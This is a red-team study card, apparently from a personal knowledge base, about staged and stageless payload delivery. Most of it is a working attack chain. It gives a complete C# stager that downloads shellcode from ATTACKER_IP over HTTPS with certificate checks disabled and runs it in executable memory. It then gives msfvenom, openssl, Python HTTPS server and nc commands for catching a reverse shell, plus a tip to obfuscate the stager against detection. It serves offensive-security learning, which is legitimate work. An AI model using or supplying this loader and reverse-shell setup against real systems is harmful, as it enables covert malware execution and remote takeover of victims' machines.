---
{"dg-publish":true,"permalink":"/cards/red-team/staged-and-stageless/","tags":["red-team/host-evasion"]}
---

~ [[cards/red-team/Evading Antivirus - Shellcode\|Evading Antivirus - Shellcode]]
### Introduction
---
This is how we deliver our final payload, there are two types one is **staged** and the other one is **stageless**, the difference is

- **Stageless** the [[cards/blue-team/malware-analysis/Analyzing Shellcode - Malware\|shellcode]] (payload) is embedded to itself, it's similar to a packaged app, the user opens the package then gets the 'reward'. A single step process.

- **Staged** it uses intermediary shellcode (payload) that leads to the execution of the final shellcode. Each of these 'intermediary' shellcodes is known as **stager** with a sole purpose of retrieving the final shellcode.
	- First stage (or the intermediary shellcode) is usually referred to as **stage0**.
	- Do note it's not limited to first stage then final payload - it could have many stages.

```staged
1. User Executes Payload -> 2. Retrieve FinalShell Code from Attacker ->
3.Load and execute final shellcode in memory -> 4. Send reverse shell
```


#### Key Topics
---
## Prerequisites
---
- [[cards/windows/Windows Internals\|Windows Internals - Processes, threads, Virtual Memory, and more.]]
- [[cards/red-team/Evading Antivirus - Shellcode\|Evading Antivirus - Shellcode]]
- [[cards/windows/Windows API\|Windows API]] 
## Why Stageless When Staged?
---

**Stageless**

- Attacking a host with very restricted network connectivity. Great to have fewer network detection
- Has a lot of perimeter security - see [[cards/red-team/Lay off the Land\|Lay off the Land]] to enumerate a host.

**Staged**

- Small footprint on disk - since **stage0** is only in charge of downloading the finalshellcode, it will most likely be small in size.
- **Final shellcode** isn't embedded into the executable - Blue team will only have access to the stage0 and nothing more. Useful for red teaming or a must 'hack' infrastructure.
- stage0 can simply be reused but it is recommended to change it up a little bit as security tools regularly scans for patterns.

So in summary:

- For _closed or heavily monitored environments_, **stageless** makes sense.
- For _persistent, stealthy campaigns_, **staged** with a well-crafted Stage0 and obfuscated final stage is often the better choice.

### Stagers in Metasploit
---
In metasploit, we can identify a stager and a stageless via the `_` and `/`:

| **Payload**                   | **Type**          |
| ----------------------------- | ----------------- |
| windows/x64/shell_reverse_tcp | Stageless payload |
| windows/x64/shell/reverse_tcp | Staged payload    |
## Basic Stager 
---
Here is a stager code, note it's best to add some obfuscation or any thing that can prevent pattern detection:

```csharp
using System;
using System.Net;
using System.Text;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;

public class Program {
  //https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc 
  [DllImport("kernel32")]
  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

  //https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread
  [DllImport("kernel32")]
  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

  //https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject
  [DllImport("kernel32")]
  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

  private static UInt32 MEM_COMMIT = 0x1000;
  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

  public static void Main()
  {
    string url = "https://ATTACKER_IP/shellcode.bin";
    Stager(url);
  }

  public static void Stager(string url)
  {

    WebClient wc = new WebClient();
    ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

    byte[] shellcode = wc.DownloadData(url);

    UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);

    IntPtr threadHandle = IntPtr.Zero;
    UInt32 threadId = 0;
    IntPtr parameter = IntPtr.Zero;
    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);

    WaitForSingleObject(threadHandle, 0xFFFFFFFF);

  }
}
```

Breaking down the code:

Importing functions from `kernel32.dll`: (`VirtualAlloc`, `CreateThread`, `WiatForSingleObject`):

![Staged and Stageless.png](/img/user/cards/red-team/images/Staged%20and%20Stageless.png)

The second most important part is the `Stager()` function:

![Staged and Stageless-1.png](/img/user/cards/red-team/images/Staged%20and%20Stageless-1.png)

- `Webclient` allows us to download a shellcode using web request.
- `ServiceCertificateValidationCallback` allows us to download files from a server with self-signed or invalid certificate.
- `DownloadData` well it downloads I guess???? then stores it into the shell code var.

![Staged and Stageless-2.png](/img/user/cards/red-team/images/Staged%20and%20Stageless-2.png)

- `VirtualAlloc` copy the shell code into the executable memory by requesting a memory block from the OS -- notice the use of `shellcode.length` and we make the memory executable, readable and writable via `PAGE_EXECUTE_READWRITE`.
- Copy the contents of the shellcode into the var `codeAddr` via `Marshal.Copy` function.

![Staged and Stageless-3.png](/img/user/cards/red-team/images/Staged%20and%20Stageless-3.png)

- `CreateThread` to spawn a new thread on the current process that will execute our shellcode.
- The third parameter passed to CreateThread points to `codeAddr`, where our shellcode is stored, so that when the thread starts, it runs the contents of our shellcode.
- The fifth parameter is set to **0** which means the thread will start immediately.
- Once the thread is created, call the `WaitForSingleObject()` function to instruct our current program that it has to wait for the thread execution to finish before continuing. This prevents our program from closing before the shellcode thread gets a chance to execute.

### Running our Stager to get a reverse shell
---
Make sure to change the URL in the stager0 code then compile with:

```C
csc staged-payload.cs
```

At the attacker's box generate a simple reverse shell:

```C
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7474 -f raw -o shellcode.bin -b '\x00\x0a\x0d'
```

Creating a simple self-signed certificate for our HTTPs server:

```C
openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes
```

Then hosting our payload by running a simple HTTPs server with python:

```C
python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"
```

Then listening for reverse shell connections:

```C
nc -lvp 7474
```

Then:

![Staged and Stageless-4.png](/img/user/cards/red-team/images/Staged%20and%20Stageless-4.png)
